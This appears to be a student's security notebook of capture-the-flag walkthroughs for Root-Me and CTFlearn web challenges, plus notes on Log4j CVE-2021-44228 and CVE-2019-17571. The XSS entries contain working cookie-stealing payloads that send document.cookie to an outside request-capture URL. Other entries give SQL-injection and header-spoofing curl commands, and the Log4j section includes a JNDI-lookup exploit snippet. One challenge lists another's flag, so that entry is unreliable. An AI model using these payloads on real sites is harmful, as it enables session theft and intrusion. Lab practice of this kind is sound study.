# 1. Web application vulnerabilities

## [XSS Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)

### Steps to reproduce

    - Create a free request capturer @ https://pipedream.com
    - Start event listening at the request capturer
    - Visit http://challenge01.root-me.org/web-client/ch18/
    - Choose any title
    - Enter <script>document.write("<img src=request_capturer_url"+document.cookie+"/>");</script> as message payload
    - Simple xss attack
    - Wait for the bot to load the image and thus the cookie stealer
    - Copy the flag in the captured request cookie

## [XSS Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)

### Steps to reproduce

    - Create a free request capturer @ https://pipedream.com
    - Start event listening at the request capturer
    - Visit http://challenge01.root-me.org/web-client/ch19/
    - Choose any title
    - Enter "><script>document.write(%22<img src=request_capturer_url?%22.concat(document.cookie.replace(%22 %22,%22&%22)).concat(%22 />%22))</script> as message payload
    - We bypass angle brackets, quotation marks and encode the payload
    - Wait for the bot to load the image and thus the cookie stealer
    - Copy the admin cookie in the captured request
    - Change the document cookie to the admin cookie
    - Visit the admin section
    - Copy the flag

## [XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)

### Steps to reproduce

    - Create a free request capturer @ https://pipedream.com
    - Start event listening at the request capturer
    - Visit http://challenge01.root-me.org/web-client/ch26/?p=exp' onmouseover='document.write(%22<img src=request_capturer_url?%22.concat(document.cookie).concat(%22 />%22))
    - Exp' is the reflected xss, we want the document cookie, we encode the paylod
    - Click on Report to the administrator
    - Wait for the bot to load the image and thus the cookie stealer
    - Copy the flag in the captured request cookie

## [XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)

### Steps to reproduce

    - Create a free request capturer @ https://pipedream.com
    - Start event listening at the request capturer
    - Visit http://challenge01.root-me.org/web-client/ch32/contact.php
    - As a payload insert http://challenge01.root-me.org/web-client/ch32/index.php?number=%27%3Bdocument.location.href%3D%27https%3A%2F%2F6b6fea4abe6e6a0876505f85b3377c72.m.pipedream.net%2F%3Fitworks%3D%27.concat%28document.cookie%29%3B%2F%2F
    - The url uses document.location to directly redirect, the url is url encoded, the payload breaks out of the client script by suffix '; and prefix // respectively
    - Click on Submit
    - Wait for the bot to click on the link
    - Copy the flag in the captured request cookie

## [HTTP - Cookies](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Cookies)

### Steps to reproduce

    - Start curl interactively: curl -v http://challenge01.root-me.org/web-serveur/ch7/ 
    - Make a POST request with the paylod mail=adm%4Dadm.de&jsep4b=send
    - A cookie with visitor privileges is set
    - Change the cookie value from visitor to admin
    - Make a new GET request to receive the flag

## [HTTP - Directory indexing](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Directory-indexing)

### Steps to reproduce

    - Visit http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt
    - Copy the flag

## [HTTP - Headers](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Headers)

### Steps to reproduce

    - Set the header rootme admin to true through curl
    - For this run curl --header "Header-RootMe-Admin: true" http://challenge01.root-me.org/web-serveur/ch5/
    - Copy the flag from the response

## [HTTP - IP restriction bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)

### Steps to reproduce

    - Copy your ipv4 address from ipconfig/ifconfig/netstat etc.
    - Run curl -k http://challenge01.root-me.org/web-serveur/ch68/ -H "X-Forwarded-For: 'your_ipv4_address'"
    - Copy the flag from the response

## [HTTP - Improper redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Improper-redirect)

### Steps to reproduce

    - Run curl -v http://challenge01.root-me.org/web-serveur/ch32/login.php?redirect
    - Run curl -v http://challenge01.root-me.org/web-serveur/ch32/index.php?redirect
    - Copy the flag from the response

## [HTTP - Open redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect)

### Steps to reproduce

    - MD5 hash any site e.g. google.com
    - Run a get curl for http://challenge01.root-me.org/web-serveur/ch52/ with url param set to the site and h param set to the hash
    - Copy the flag from the response

## [HTTP - POST](https://www.root-me.org/en/Challenges/Web-Server/HTTP-POST)

### Steps to reproduce

    - Run curl -X POST -F 'score=100000000' -F 'generate=Give+a+try%21' http://challenge01.root-me.org/web-serveur/ch56/
    - Copy the flag from the response

## [HTTP - User-agent](https://www.root-me.org/en/Challenges/Web-Server/HTTP-User-agent )

### Steps to reproduce

    - Set the user agent to admin (under Edge its in the dev tools Network conditions tab)
    - Reload the page
    - Copy the flag

## [HTTP - Verb tampering](https://www.root-me.org/en/Challenges/Web-Server/HTTP-verb-tampering)

### Steps to reproduce

    - Run curl -v -X OPTIONS http://challenge01.root-me.org/web-serveur/ch8/ 
    - Copy the flag from the response

# 2.  Web application vulnerabilities

## [My Blog](https://ctflearn.com/challenge/979)

### Solution: CTFlearn{n7f_l0c4l_570r463_15n7_53cur3_570r463}

### Steps to reproduce

    - Visit https://noxtal.com/
    - Open Dev Tools
    - Go to Memory
    - Create a snapshot
    - Search for flag{
    - Copy the flag and replace with CTFlearn{the_flag}

## [Basic Injection](https://ctflearn.com/challenge/88)

### Solution: CTFlearn{n7f_l0c4l_570r463_15n7_53cur3_570r463}

### Steps to reproduce

    - Visit https://web.ctflearn.com/web4/
    - Type in test' or '1 = 1
    - Inside the results search for the flag

## [Gobustme](https://ctflearn.com/challenge/1116)

### Solution: CTFlearn{gh0sbu5t3rs_4ever}

### Steps to reproduce

    - Install gobuster
    - Download the provided wordlist
    - Execute gobuster -u https://gobustme.ctflearn.com -w ~/Downloads/common.txt
    - Visit https://gobustme.ctflearn.com/hide

## [POST Practice](https://ctflearn.com/challenge/114)

### Solution: CTFlearn{p0st_d4t4_4ll_d4y}

### Steps to reproduce

    - Install curl
    - Visit http://165.227.106.113/post.php
    - Open up dev tools and look for the username and password
    - Execute curl -X POST -F 'username=admin' -F 'password=71urlkufpsdnlkadsf' http://165.227.106.113/post.php
    - Get the flag from the response

## [Where Can My Robot Go?](https://ctflearn.com/challenge/107)

### Solution: CTFlearn{r0b0ts_4r3_th3_futur3}

### Steps to reproduce

    - Visit https://ctflearn.com/robots.txt
    - Look for the disallow URL
    - Vist https://ctflearn.com/70r3hnanldfspufdsoifnlds.html
    - Get the flag from the page

## [Base 2 2 the 6](https://ctflearn.com/challenge/192)

### Solution: CTF{FlaggyWaggyRaggy}

### Steps to reproduce

    - Visit https://www.base64decode.org/
    - Decrypt the provided key


# 3.  Known real-world software vulnerabilities

## CVE-2021-44228

Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.

### source code version before detection of the vulnerability

2.12.1 and 2.13.0 through 2.15.0

### source code version released after the vulnerability was discovered

From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed

### type of vulnerability

Remote code execution

### source code lines that are affected & fix

* [Restrict LDAP access via JNDI](https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;h=c77b3cb)
* [Log4j2 no longer formats lookups in messages by default](https://github.com/apache/logging-log4j2/pull/607/commits/2731a64d1f3e70001f6be61ba5f9b6eb55f88822)

### exploit

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
    }
}
```

### mitigation

* Restrict LDAP access via JNDI
* Disable most JNDI protocols
* Log4j 1.x mitigation: Log4j 1.x does not have Lookups so the risk is lower. Applications using Log4j 1.x are only vulnerable to this attack when they use JNDI in their configuration. A separate CVE (CVE-2021-4104) has been filed for this vulnerability. To mitigate: audit your logging configuration to ensure it has no JMSAppender configured. Log4j 1.x configurations without JMSAppender are not impacted by this vulnerability.
* Log4j 2.x mitigation: Implement one of the mitigation techniques below.
* Java 8 (or later) users should upgrade to release 2.16.0.
* Users requiring Java 7 should upgrade to release 2.12.2 when it becomes available (work in progress, expected to be available soon).
* Otherwise, remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
* In previous releases (>2.10) this behavior can be mitigated by setting system property "log4j2.formatMsgNoLookups" to “true”

## CVE-2019-17571

Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data. This affects Log4j versions up to 1.2 up to 1.2.17.

### source code version before detection of the vulnerability

1.2 up to 1.2.17

### source code version released after the vulnerability was discovered

2.8.2 or higher

### type of vulnerability

Remote code execution

### source code lines that are affected

```java
public SocketNode(Socket socket2, LoggerRepository hierarchy2) {
    this.socket = socket2;
    this.hierarchy = hierarchy2;
    try {
        this.ois = new ObjectInputStream(new BufferedInputStream(socket2.getInputStream()));
    } catch (InterruptedIOException e) {
        Thread.currentThread().interrupt();
        logger.error(new StringBuffer().append("Could not open ObjectInputStream to ")
        .append(socket2).toString(), e);
    } catch (IOException e2) {
        logger.error(new StringBuffer().append("Could not open ObjectInputStream to ")
        .append(socket2).toString(), e2);
    } catch (RuntimeException e3) {
        logger.error(new StringBuffer().append("Could not open ObjectInputStream to ")
        .append(socket2).toString(), e3);
    }
}`
```

### exploit

[CVE-2019-17571 exploit](https://0xsapra.github.io/website/CVE-2019-17571)

### fix

* [Deprecate SerializedLayout and remove it as default.](https://git-wip-us.apache.org/repos/asf?p=logging-log4j2.git;h=7067734)
* [Add class filtering to AbstractSocketServer](https://git-wip-us.apache.org/repos/asf?p=logging-log4j2.git;h=5dcc192)
